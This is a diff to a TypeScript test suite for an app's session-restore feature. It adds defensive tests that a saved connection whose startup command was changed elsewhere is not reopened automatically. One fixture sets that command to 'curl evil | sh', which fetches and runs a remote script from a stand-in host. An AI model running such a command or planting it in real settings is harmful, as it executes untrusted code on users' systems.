@@ -74,6 +74,11 @@ setupAgentsRegion();
 import { saveSettings } from "@/services/storage";
 import { summarizeLastSession } from "@/utils/restoreMode";
 import type { LastSession } from "@/types/lastSession";
+import type { SavedConnection } from "@/types/connection";
+import {
+  ensureSavedConnectionBaseline,
+  resetSavedConnectionTrustForTest,
+} from "@/services/savedConnectionTrust";
 import { layoutState } from "@/test/layoutState";
 import { getAllLeaves } from "@/utils/panelTree";
 
@@ -226,7 +231,50 @@ describe("startup restore mode", () => {
       await useAppStore.getState().confirmRestorePrompt(false);
 
       expect(currentSettingsView().restoreLastSessionMode).toBe("ask");
-      expect(mockPersistSettings).not.toHaveBeenCalled();
+      for (const [written] of mockPersistSettings.mock.calls) {
+        expect((written as { restoreLastSessionMode?: string }).restoreLastSessionMode).toBe("ask");
+      }
+    });
+  });
+
+  describe("a saved connection changed elsewhere (#6065)", () => {
+    const build = (initialCommand: string): SavedConnection => ({
+      id: "Build",
+      name: "Build",
+      folderId: null,
+      config: { type: "local", config: { shell: "bash", initialCommand } },
+    });
+    const byRef: LastSession = {
+      version: "1",
+      activeGroupIndex: 0,
+      tabGroups: [
+        { name: "Restored", layout: { type: "leaf", tabs: [{ connectionRef: "Build" }] } },
+      ],
+    };
+    const restoredTab = () => getAllLeaves(layoutState().tabGroups[0].rootPanel)[0].tabs[0];
+
+    beforeEach(() => {
+      resetSavedConnectionTrustForTest();
+      seedSettings({ workspaceImportAllowlist: [] });
+      mockLoad.mockResolvedValue(byRef);
+    });
+
+    it("is not reopened unasked after a restore changed its command", async () => {
+      seedConnectionsRegion({ connections: [build("make")] });
+      await ensureSavedConnectionBaseline();
+      seedConnectionsRegion({ connections: [build("curl evil | sh")] });
+      await useAppStore.getState().restoreLastSession();
+      expect(restoredTab()).toMatchObject({
+        pendingImportedConnection: true,
+        pendingConnectionChanged: true,
+      });
+    });
+
+    it("reopens an unchanged one as before", async () => {
+      seedConnectionsRegion({ connections: [build("make")] });
+      await useAppStore.getState().restoreLastSession();
+      expect(restoredTab().pendingImportedConnection).toBeUndefined();
+      expect(restoredTab().config).toEqual(build("make").config);
     });
   });
 
